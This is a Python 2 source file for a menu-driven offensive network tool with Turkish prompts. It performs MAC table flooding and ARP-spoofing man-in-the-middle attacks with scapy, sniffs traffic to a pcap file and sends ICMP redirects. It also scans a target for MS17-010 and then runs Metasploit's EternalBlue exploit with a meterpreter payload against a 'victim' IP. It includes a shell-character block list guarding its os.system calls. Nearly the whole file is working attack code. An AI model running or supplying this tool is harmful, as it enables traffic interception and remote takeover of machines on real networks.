#!/usr/local/bin/python
# -*- coding: utf-8 -*-

import random
import socket
from scapy.all import *
import os
import time
import pyshark
import re


def control_black_list(list1, IP):
    black_list = ['{', '}', '(', ')', '<', '>', '&', '*',
                  '|', '=', '?', ';', '[', ']', '$', '–',
                  '‘', '#', '~', '!', '”', '%', '/', '\\',
                  ':', '+', ',', '`']
    for i in list1:
        for j in black_list:
            if j == i:
                return None

    return IP


def CreateMAC():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )


def MyIp():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    return IPAddr


def Ping(IP):
    if IP == None:
        pass

    else:
        os.system("ping -c 2 " + IP)


def Find_Mac(IP):
    if IP == MyIp():
        os.system("ifconfig > mac.txt")

    elif IP == None:
        print("Lütfen ip adresini dogru giriniz")
        return None

    else:
        os.system("arp -n | grep " + IP + " > mac.txt")

    rgx = '([0-9a-f]{2}(?::[0-9a-f]{2}){5})'
    with open("mac.txt", "r") as file:
        string = file.read()
        mac = re.findall(rgx, string)

        if not mac:
            print('Cihazla aynı ağda olduğunuza emin olun..! \n')
            os.system("rm -rf mac.txt")
            return None

    os.system("rm -rf mac.txt")

    return mac[0]


def Mac_Table_Attack():
    while True:
        packets = raw_input('Gondermek istediginiz paket sayisini giriniz-> ')

        if not packets.isdigit():
            print("\nlütfen paket sayisini dogru giriniz.\n")
            continue

        while True:
            VIP = raw_input('Kurbanin IP adresini giriniz-> ')

            kontrol = list(VIP)

            VIP = control_black_list(kontrol, VIP)

            Ping(VIP)
            Dst_Mac = Find_Mac(VIP)

            if Dst_Mac != None:
                break

        break

    print('\nRoot olarak calistirdiginiza emin olun ')

    print('\n\nSaldiri baslatildi..! ')
    time.sleep(1.0)

    try:
        for i in range(0, int(packets)):
            sendp(Ether(src=CreateMAC(), dst=Dst_Mac, type=0x806) /
            IP(src=MyIp(), dst=VIP, chksum=0x60b2) / UDP() /
            ARP(hwdst='00:00:00:00:00:00', ptype=2048, hwtype=1,
            psrc=MyIp(), hwlen=6, plen=4, pdst=VIP,
            hwsrc='00:11:22:aa:bb:cc', op=2))

    except KeyboardInterrupt:
        print()


def Middle_Man():
    while True:
        VIP = raw_input('Kurbanin IP adresini giriniz-> ')
        GW = raw_input('Gatewayin IP adresini giriniz-> ')

        kontrol = list(VIP)
        kontrol2 = list(GW)

        VIP = control_black_list(kontrol, VIP)
        GW = control_black_list(kontrol2, GW)

        Ping(VIP)
        Ping(GW)

        GW_Mac = Find_Mac(GW)
        My_Mac = Find_Mac(MyIp())
        VIP_Mac = Find_Mac(VIP)

        if GW_Mac and VIP_Mac != None:
            break

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print("\nRoot olarak calistirdiginiza emin olun..! ")
    print("\n\nArp zehirlemesi baslatıldı..!")
    time.sleep(1.0)

    try:
        while True:
            sendp(Ether(src=My_Mac, dst="ff:ff:ff:ff:ff:ff") /
            ARP(pdst=VIP, hwsrc=My_Mac, psrc=GW, hwdst='00:00:00:00:00:00', ptype=2048,
            hwtype=1, hwlen=6, plen=4, op=2))  # kurbana gönderilen paket
            time.sleep(0.1)

            sendp(Ether(src=My_Mac, dst=GW_Mac) /
            ARP(pdst=GW, hwsrc=My_Mac, psrc=VIP, hwdst='00:00:00:00:00:00',ptype=2048,
            hwtype=1, hwlen=6, plen=4, op=2))  # Gateway'e giden paket
            time.sleep(0.1)

    except KeyboardInterrupt:
        print()

def sniffer():

    while True:
        zaman = raw_input('kac saniye dinleme yapmak istediğinizi giriniz->')
        if not zaman.isdigit():
            print("lütfen integer bir sayi giriniz..!")
        else:
            break

    print("\nDinleme Baslatildi..!")
    print("\n\nDinleme ciktisi /root/Desktop/ dizinine out.pcap olarak kayıt edilir..!")

    try:
        cap = pyshark.LiveCapture(output_file = '/root/Desktop/out.pcap',interface = 'eth0')
        cap.sniff(timeout = int(zaman))

    except KeyboardInterrupt:
        print("\n")


def ms17_010():
    while True:
        boolen = "H"
        sayac = 0

        VIP = raw_input('kurbanin ip adresini giriniz->')

        kontrol = list(VIP)
        VIP = control_black_list(kontrol, VIP)

        if VIP != None:
            break
    print("\nPort taramasi yapiliyor lütfen bekleyin..")
    os.system("nmap -p 445 --script smb-vuln-ms17-010 " + VIP + " > zafiyet.txt")

    with open("zafiyet.txt", "r") as file:
        liste = file.readlines()

    for i in liste:
        if i == "445/tcp open  microsoft-ds\n" or i == "|     State: VULNERABLE\n":
            sayac += 1

    os.system("rm -rf zafiyet.txt")

    while True:
        if sayac == 0:
            print("\n445 numarali port acik degil")
            break

        elif sayac == 1:
            print("\nZafiyet bulunamadı..")
            break

        else:
            boolen = raw_input("\nms17_010 zafiyeti tespit edildi..! Saldırı yapmak istermisiniz?(E:evet,H:hayır)")

        if boolen == "E":
            try:
                os.system(
                    "msfconsole -x \" use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS " + VIP + "; set PAYLOAD windows/x64/meterpreter/bind_tcp ; set RHOST " + VIP + " ; run \" ")
                break

            except KeyboardInterrupt:
                break

        elif boolen == "H":
            break

        else:
            print("lütfen E:evet yada H:hayir diye yanitlayiniz")

def icmp_redirect():
    while True:
        VIP = raw_input("Kurbanın ip adresini giriniz->")
        GW = raw_input("Gateway'in ip adresini giriniz->")

        kontrol = list(VIP)
        kontrol2 = list(GW)

        VIP = control_black_list(kontrol,VIP)
        GW = control_black_list(kontrol2,GW)

        if VIP != None and GW != None:
            break

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    try:
        while True:
            send(IP(src=GW,dst=VIP)/ ICMP(type=5,code=1,gw=MyIp()) /
            IP(src=VIP,dst="0.0.0.0") /
            TCP(flags="S",dport=80,seq=44444,sport=5555))
            time.sleep(1)

    except KeyboardInterrupt:
        print()


if __name__ == '__main__':
    os.system("clear")

    print("""
     _______                         _                 
    (_______)  _     _              | |                
     _______ _| |_ _| |_ _____  ____| |  _ _____  ____ 
    |  ___  (_   _|_   _|____ |/ ___) |_/ ) ___ |/ ___)
    | |   | | | |_  | |_/ ___ ( (___|  _ (| ____| |    
    |_|   |_|  \__)  \__)_____|\____)_| \_)_____)_|    
                                                      """)
    options = "Yardım almak için lütfen help yazınız.."
    try:
        while True:
            inp = raw_input("->")

            if inp == "A0":
                Mac_Table_Attack()

            elif inp == "A1":
                Middle_Man()

            elif inp == "A2":
                sniffer()

            elif inp == "A3":
                ms17_010()

            elif inp == "A4":
                icmp_redirect()

            elif inp == "help":
                print(""" 
                A0\t\t\t\t Mac Table Attack
                ---------------------------------------------------------
                A1\t\t\t\t Arp Spoofing
                ---------------------------------------------------------
                A2\t\t\t\t Sniffer
                ---------------------------------------------------------
                A3\t\t\t\t Ms17-010
                ---------------------------------------------------------
                A4\t\t\t\t ICMP Redirect Attack
                """)

            else:
                print(options)

    except KeyboardInterrupt:
        print()

